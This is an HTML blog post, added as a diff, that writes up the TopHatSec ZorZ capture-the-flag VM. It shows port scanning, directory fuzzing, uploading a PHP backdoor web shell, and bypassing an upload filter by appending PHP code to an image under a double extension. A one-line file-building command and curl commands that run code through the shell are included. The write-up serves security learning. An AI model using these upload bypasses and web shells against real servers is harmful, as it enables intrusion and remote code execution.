@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>TopHatSec: ZorZ - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-04-07">April 07, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/tophatsec">tophatsec</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">TopHatSec: ZorZ</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This VM contains 3 web application challenges, which focus on file upload and filter bypass.</p>
+
+<h2 id="discovery:67b7c5d17181120e8623e1b28dc920b5">Discovery</h2>
+
+<p>Only ports 22 and 80 are open.</p>
+
+<pre><code class="language-text">root@kali:~# nmap -n -p- -A 192.168.56.102
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey: 
+|   1024 48:bb:d8:38:b8:25:a6:6c:5e:7f:67:c9:ec:53:cc:ed (DSA)
+|   2048 ec:55:48:93:28:90:f6:bf:3c:cd:e3:90:42:26:3b:5d (RSA)
+|_  256 3f:0a:11:c9:59:73:be:df:f7:77:59:65:07:91:d7:d6 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=4/9%Time=5526DEE1%P=x86_64-unknown-linux-gnu%r(
+SF:NULL,29,&quot;SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n&quot;);
+</code></pre>
+
+<p>Let&rsquo;s head over to port 80 in a web browser.</p>
+
+<h2 id="level-1:67b7c5d17181120e8623e1b28dc920b5">Level 1</h2>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/1/zorz.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>I downloaded an image off the Internet and uploaded it to the server.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/1/upload.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>The file uploads, which is good, but now I need to find it&hellip; <code>/tmp/phpsu5a08</code> was not valid (404), as was <code>/tmp/rastamouse.jpg</code>.  So now it&rsquo;s time to break out the web fuzzers!  I didn&rsquo;t get any hits with my usual <code>wfuzz</code> wordlists, but I did with <code>dirb</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/1/dirb.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>The interesting directory is <code>uploads2</code>, though it turns out this is the directory for challenge 2.  So I manually tried <code>uploads1</code> and found <code>rastamouse.jpg</code> there.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/1/index.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>I took a copy of <code>/usr/share/webshells/php/php-simple-backdoor.php</code> and uploaded it as <code>catflap1.php</code>.  This was uploaded successfully, so it seems this level has no filtering or protection in place at all.</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.56.102/uploads1/catflap1.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<h2 id="level-2:67b7c5d17181120e8623e1b28dc920b5">Level 2</h2>
+
+<p>Attempting to upload the same PHP file for level 2 fails miserably.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/2/sorry.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>If we intercept the request with <code>burp</code>, we can see there&rsquo;s a <code>Content-Disposition</code> header.  Note the <code>filename</code>, we will change this later.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/2/burp.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>I sent the POST to Burp Repeater and tried various things to get PHP uploaded.  After a few tried, I found that the following combination worked:  Injecting PHP code at the end of the image data and modifying the file extension (to force the server to process the PHP data).</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/2/burp2.jpg"  />
+    
+    
+</figure>
+</div>
+
+<pre><code class="language-text">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;rastamouse.php.jpg&quot;
+</code></pre>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/2/success.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>When you access the URL, the binary data for the image is display in gibberish, but at the very bottom the successful PHP is shown.</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.56.102/uploads2/rastamouse.php.jpg
+</code></pre>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/2/rce.jpg"  />
+    
+    
+</figure>
+</div>
+
+<pre><code class="language-text">curl http://192.168.56.102/uploads2/rastamouse.php.jpg?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>To create the same file outside of Burp, it&rsquo;s as simple as:</p>
+
+<pre><code class="language-text">root@kali:~/vulnhub/zorz/2# cat rastamouse.jpg catflap2.php &gt; catflap2.php.jpg
+</code></pre>
+
+<h2 id="level-3:67b7c5d17181120e8623e1b28dc920b5">Level 3</h2>
+
+<p>It turns out that my file for Level 2 worked for Level 3 as well.  That was easy ^_^.</p>
+
+<p><div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/zorz/3/zorz.jpg"  />
+    
+    
+</figure>
+</div></p>
+
+<p>So let&rsquo;s collect the flag.</p>
+
+<pre><code class="language-text">$ ls -l
+drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337
+
+$ ls -l l337saucel337
+-rw-r--r-- 1 root root 400 Feb 18 22:45 SECRETFILE
+
+$ cat l337saucel337/SECRETFILE
+Great job so far. This box has 3 uploaders.
+
+The first 2 are pure php, the last one is php w/jquery.
+
+To get credit for this challenge, please submit a write-up or instructions
+on how you compromised the uploader or uploaders. If you solve 1, 2, or all
+of the uploader challenges, feel free to shoot me an email and let me know!
+
+admin@top-hat-sec.com
+
+Thanks for playing!
+http://www.top-hat-sec.com
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
